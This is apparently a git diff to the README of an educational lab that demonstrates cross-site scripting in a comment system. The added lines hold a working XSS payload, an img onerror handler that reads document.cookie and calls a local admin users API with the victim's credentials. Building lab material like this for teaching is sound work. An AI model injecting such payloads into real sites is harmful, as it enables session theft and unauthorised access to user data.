@@ -1,5 +1,9 @@
 # Cross-Site Scripting (XSS) Vulnerability Demonstration
 
+#webApp script
+```<img src=x onerror="(async()=>{try{const api='http://localhost:5000';console.log('[XSS] cookie=',document.cookie);const r=await fetch(api+'/api/admin/users',{credentials:'include'});const users=await r.json();console.log('[XSS] users:',users);}catch(e){console.error('[XSS] error',e);}})()">```
+
+
 This project demonstrates a Cross-Site Scripting (XSS) vulnerability in a comment system with a database backend. It's designed for educational purposes to help understand how XSS vulnerabilities work, their potential impact, and how to prevent them.
 
 ## ⚠️ Important Warning
